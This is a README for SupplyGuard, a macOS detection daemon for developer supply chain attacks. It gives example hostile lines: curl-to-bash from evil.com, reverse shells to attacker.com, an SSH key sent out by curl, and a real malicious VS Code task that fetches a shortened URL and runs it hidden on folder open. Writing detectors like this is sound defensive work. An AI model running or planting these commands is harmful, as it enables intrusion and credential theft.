# SupplyGuard

**Real-time supply chain attack detection daemon for macOS**

SupplyGuard is a lightweight, event-driven daemon that monitors your filesystem in real-time to detect and block supply chain attacks targeting developers. Unlike traditional antivirus software, SupplyGuard understands developer workflows and detects malicious code in repositories, packages, and development tools.

## What is a Supply Chain Attack?

Supply chain attacks target developers by injecting malicious code into trusted development tools and dependencies. Common attack vectors include:

- **VS Code Tasks**: Malicious `.vscode/tasks.json` files that execute code when a folder opens
- **Git Hooks**: Compromised `.git/hooks/*` scripts that run during git operations
- **Package Scripts**: Malicious `postinstall` scripts in `package.json` or `setup.py`
- **Build Scripts**: Compromised `build.rs` or build scripts that execute during compilation
- **CI/CD Backdoors**: Malicious GitHub Actions or GitLab CI configurations
- **Shell Config Poisoning**: Malicious changes to `~/.zshrc`, `~/.bashrc`, and other shell config files
- **Package Manager Interception**: Scan npm, pip, and cargo packages before install scripts run

Traditional antivirus software misses these attacks because they don't understand developer workflows. SupplyGuard is specifically designed to detect these patterns.

## Why SupplyGuard?

- **Real-time Detection**: Monitors filesystem events using FSEvents, detecting threats as they appear
- **Zero False Positives**: Pattern-based detection with context-aware analysis
- **Lightweight**: 2-4MB binary, <40MB memory idle, <100MB scanning
- **Offline Operation**: Fully local, no cloud API calls required
- **Developer-Focused**: Understands VS Code, npm, Cargo, Python, Git workflows
- **Shell Config Guard**: Monitors shell config files for poisoning; diffs against last known-good snapshot
- **Pre-Install Scanning**: Optional wrappers for npm, pip, and cargo scan packages before install scripts run
- **Native macOS Integration**: Uses launchd, native notifications, and macOS security features

## Installation

### Quick Install

```bash
git clone https://github.com/yourusername/supplyguard.git
cd supplyguard
./install.sh
```

### Manual Installation

```bash
# Build release binary
cargo build --release

# Copy binary
sudo cp target/release/supplyguard /usr/local/bin/
sudo chmod 755 /usr/local/bin/supplyguard

# Create directories
sudo mkdir -p /var/log/supplyguard
mkdir -p ~/.supplyguard/quarantine

# Initialize configuration
supplyguard config init

# Install launchd daemon
sudo cp com.supplyguard.daemon.plist /Library/LaunchDaemons/
sudo launchctl load /Library/LaunchDaemons/com.supplyguard.daemon.plist
sudo launchctl start com.supplyguard.daemon
```

## Uninstallation

### Quick Uninstall

To remove SupplyGuard completely:

```bash
./uninstall.sh
```

This will:
- Stop and unload the daemon
- Remove the binary from `/usr/local/bin/supplyguard`
- Remove the launchd plist file
- Remove log files from `/var/log/supplyguard`
- **Preserve** user data in `~/.supplyguard` (config, database, quarantine)

### Complete Removal

To remove SupplyGuard **and all user data** (config, threat database, quarantined files):

```bash
# Run uninstall script
./uninstall.sh

# Remove user data directory
rm -rf ~/.supplyguard
```

### Manual Uninstallation

If you prefer to uninstall manually:

```bash
# Stop and unload daemon
sudo launchctl stop com.supplyguard.daemon
sudo launchctl unload /Library/LaunchDaemons/com.supplyguard.daemon.plist

# Remove binary
sudo rm -f /usr/local/bin/supplyguard

# Remove launchd plist
sudo rm -f /Library/LaunchDaemons/com.supplyguard.daemon.plist

# Remove log files
sudo rm -rf /var/log/supplyguard

# Optional: Remove user data (config, database, quarantine)
rm -rf ~/.supplyguard
```

**Note**: The uninstall script preserves your configuration, threat database, and quarantined files in `~/.supplyguard`. If you want to completely remove all traces of SupplyGuard, manually delete `~/.supplyguard` after running the uninstall script.

## Usage

### Prerequisites (for `scan-package` / interception)

Package scanning and interception rely on the underlying package managers and a few standard tools being installed and available in `PATH`:

- **npm scanning**: `npm`, `tar`
- **pip scanning**: `pip`, `tar` and/or `unzip` (depending on sdist/wheel)
- **cargo scanning**: `cargo`

### CLI Commands

```bash
# Start daemon
supplyguard start

# Stop daemon
supplyguard stop

# Check status
supplyguard status

# Manually scan a directory
supplyguard scan ~/Projects/my-repo

# Scan a package before installing (used by intercept wrappers)
supplyguard scan-package npm <package> [version]
supplyguard scan-package pip <package> [version]
supplyguard scan-package cargo <package> [version]

# Package manager interception (wrap npm, pip, cargo to scan before install)
supplyguard intercept enable   # Install wrappers to /usr/local/bin (may require sudo)
supplyguard intercept disable  # Remove wrappers
supplyguard intercept status   # Show which managers are intercepted

# List detected threats
supplyguard threats --limit 20

# Manage quarantined files
supplyguard quarantine list
supplyguard quarantine restore <id>

# Manage whitelist
supplyguard whitelist add "**/node_modules/**" --reason "Trusted dependency directory"

# Configuration
supplyguard config show
supplyguard config init
```

## Detected Threat Types

### VS Code Auto-Run Attacks
Detects `.vscode/tasks.json` files configured to run automatically when a folder opens:

```json
{
  "runOptions": {
    "runOn": "folderOpen"  // ⚠️ CRITICAL
  }
}
```

### Malicious Install Scripts
Detects `curl | sh` and `wget | sh` patterns in package scripts:

```json
{
  "scripts": {
    "postinstall": "curl https://evil.com/script.sh | bash"  // ⚠️ CRITICAL
  }
}
```

### Git Hook Malware
Detects malicious code in `.git/hooks/*` files:

```bash
#!/bin/bash
curl https://evil.com/exfiltrate.sh | bash  // ⚠️ CRITICAL
```

### Reverse Shells
Detects reverse shell connection patterns:

```bash
nc -e /bin/bash attacker.com 4444  // ⚠️ CRITICAL
bash -i >& /dev/tcp/attacker.com/4444  // ⚠️ CRITICAL
```

### Credential Theft
Detects access to credential files:

```bash
cat ~/.ssh/id_rsa | curl -X POST https://evil.com/upload  // ⚠️ HIGH
```

### Obfuscated Code
Detects base64-encoded payloads and obfuscated execution:

```bash
echo "base64payload" | base64 -d | sh  // ⚠️ HIGH
```

### Build Script Attacks
Detects malicious code in `build.rs` or `setup.py`:

```rust
// build.rs
Command::new("sh").arg("-c").arg("curl evil.com | sh")  // ⚠️ HIGH
```

### CI/CD Backdoors
Detects malicious GitHub Actions or GitLab CI configurations:

```yaml
# .github/workflows/ci.yml
- run: curl https://evil.com/backdoor.sh | bash  // ⚠️ CRITICAL
```

### Shell Config Poisoning
Monitors `~/.zshrc`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.zprofile`, and `~/.config/fish/config.fish`. Diffs new content against a stored snapshot and flags:

- **curl/wget piped to sh/bash**
- **Base64 decode and execute**
- **PATH prepending** with `/tmp`, hidden dirs, `/dev`, `/proc`
- **Alias shadowing** of `git`, `npm`, `pip`, `cargo`, `ssh`, `sudo`, `docker`, `kubectl`
- **Background process spawning** (`&`, `nohup`, `disown`) with suspicious commands
- **Reverse shell patterns** (`nc -e`, `bash -i`, `/dev/tcp/`)
- **Sensitive env var exfiltration** to remote endpoints

Snapshots are stored in `~/.supplyguard/` and updated only when changes are clean or after you confirm.

### Package Manager Interception
When interception is enabled, wrappers in `/usr/local/bin` shadow `npm`, `pip`, and `cargo`. Before installs:

1. The wrapper extracts package name and version.
2. It runs `supplyguard scan-package <manager> <package> [version]`.
3. **npm**: Fetches tarball, scans `package.json` scripts and `.js` files for malicious patterns.
4. **pip**: Fetches sdist/wheel, scans `setup.py`, `pyproject.toml`, and `__init__.py`.
5. **cargo**: Scans `build.rs` for network commands or writes to suspicious paths.
6. If threats are found, the install is blocked and details are shown; you can confirm to proceed.
7. If clean, the real package manager runs transparently.

**Notes:**

- **Permissions**: Installing wrappers into `/usr/local/bin` commonly requires admin privileges. Use `sudo supplyguard intercept enable` if needed.
- **Shell config changes**: `intercept enable` appends a PATH line to `~/.zshrc`, `~/.bashrc`, `~/.bash_profile`, and `~/.profile` so `/usr/local/bin` is first. Restart your shell (or `source` the relevant file) after enabling.
- **Real binaries**: The wrappers attempt to locate the “real” `npm`/`pip`/`cargo` from common locations and then `exec` it with your original arguments.

Use `supplyguard intercept enable` to install wrappers and update PATH. Use `supplyguard intercept disable` to remove the wrappers and PATH line.

## Configuration

Configuration is stored in `~/.supplyguard/config.toml`:

```toml
[monitoring]
watch_paths = [
  "~/Projects", "~/Downloads", "~/Developer",
  "~/.zshrc", "~/.bashrc", "~/.bash_profile", "~/.profile", "~/.zprofile",
  "~/.config/fish/config.fish"
]
ignored_paths = ["node_modules", ".git/objects", "target", "dist"]
scan_interval_ms = 100

[scanning]
parallel_workers = 4
max_file_size_mb = 10

[notifications]
enabled = true
min_severity = "High"

[quarantine]
enabled = true
auto_quarantine_severity = "Critical"
path = "~/.supplyguard/quarantine"

[database]
path = "~/.supplyguard/threats.db"
```

## Architecture

```
┌─────────────┐
│   launchd   │
└──────┬──────┘
       │
┌──────▼──────────┐
│  SupplyGuard   │
│    Daemon      │
└──────┬─────────┘
       │
   ┌───┴────┬──────────────┬─────────────┐
   │        │              │             │
┌──▼───┐ ┌──▼────┐ ┌────────▼──┐ ┌───────▼────┐
│FSEvents│ │Scanner│ │Database│ │Notifier │
│Watcher │ │Engine │ │(SQLite)│ │(macOS)  │
└───┬───┘ └───┬───┘ └─────────┘ └─────────┘
    │         │
    │    ┌────┴─────┐
    │    │Detectors │
    │    │(8 types) │
    │    └──────────┘
    │
┌───▼──────────────┐
│  Worker Pool     │
│  (4 workers)     │
└──────────────────┘
```

### Components

1. **FSEvents Watcher**: Monitors filesystem events using macOS FSEvents API
2. **Scanner Engine**: Runs threat detection patterns against file contents
3. **Detectors**: Specialized detectors for VS Code, Git, npm, Cargo, Python, CI/CD, and shell config files
4. **Database**: SQLite database for threat logging and scan cache
5. **Notifier**: Native macOS notifications for detected threats
6. **Worker Pool**: Parallel processing of file events

## Performance

- **Binary Size**: 2-4MB (optimized with LTO and strip)
- **Memory Usage**: 
  - Idle: 20-40MB RSS
  - Scanning: 80-100MB RSS
- **CPU Usage**:
  - Idle: <0.1%
  - Scanning: <20% burst
- **File Scan Time**: <100ms for files under 1MB
- **Database Size**: Grows to ~50MB over time
- **Total Disk Footprint**: <100MB including logs

## Real Attack Example

This is a **real attack** found in the wild:

```json
{
  "version": "2.0.0",
  "tasks": [{
    "label": "vscode",
    "type": "shell",
    "osx": {
      "command": "curl 'https://gurucooldown.short.gy/muHsMg5m' -L | sh"
    },
    "presentation": {
      "reveal": "never",
      "echo": false
    },
    "runOptions": {
      "runOn": "folderOpen"
    }
  }]
}
```

SupplyGuard detects:
1. ✅ VSCODE_AUTORUN (Critical)
2. ✅ CURL_PIPE_SHELL (Critical)
3. ✅ URL_SHORTENER (High)
4. ✅ HIDDEN_EXECUTION (High)

**Action**: Auto-quarantined immediately

## Comparison to Alternatives

| Feature | SupplyGuard | Socket.dev | Snyk | Traditional AV |
|---------|-------------|------------|------|----------------|
| Real-time detection | ✅ | ❌ | ❌ | ✅ |
| Developer-focused | ✅ | ✅ | ✅ | ❌ |
| Offline operation | ✅ | ❌ | ❌ | ✅ |
| Lightweight | ✅ | ❌ | ❌ | ❌ |
| VS Code tasks | ✅ | ❌ | ❌ | ❌ |
| Git hooks | ✅ | ❌ | ❌ | ❌ |
| Shell config monitor | ✅ | ❌ | ❌ | ❌ |
| Package manager interception | ✅ | ❌ | ❌ | ❌ |
| Free & Open Source | ✅ | ❌ | ❌ | Mixed |

## FAQ

### Does SupplyGuard impact battery life?

No. SupplyGuard uses event-driven FSEvents, not polling. Idle CPU usage is <0.1%.

### Can I whitelist false positives?

Yes. Use `supplyguard whitelist add <pattern>` to whitelist paths.

### Does SupplyGuard send data to the cloud?

No. SupplyGuard operates fully offline. All data stays on your machine.

### How do I report a false positive?

Open an issue on GitHub with:
- File path and content (sanitized)
- Detected pattern
- Why it's a false positive

### Can I run SupplyGuard on Linux or Windows?

Currently macOS only. Linux support is planned. Windows support would require significant changes.

### How does package manager interception work?

Run `supplyguard intercept enable` (or `sudo supplyguard intercept enable` if `/usr/local/bin` isn’t writable). Wrapper scripts are installed to `/usr/local/bin` for `npm`, `pip`, and `cargo`, and your shell config is updated so `/usr/local/bin` is first in PATH.

When you run `npm install <pkg>`, the wrapper calls `supplyguard scan-package npm <pkg> [version]` first; if threats are found, the install is blocked unless you confirm. Use `supplyguard intercept disable` to remove the wrappers and the PATH modification.

## Contributing

Contributions welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add tests for new detectors
4. Ensure `cargo clippy` and `cargo fmt` pass
5. Submit a pull request

## License

MIT License - see [LICENSE](LICENSE) file for details.

## Acknowledgments

- Inspired by real-world supply chain attacks targeting developers
- Built with Rust for performance and safety
- Uses FSEvents for efficient filesystem monitoring
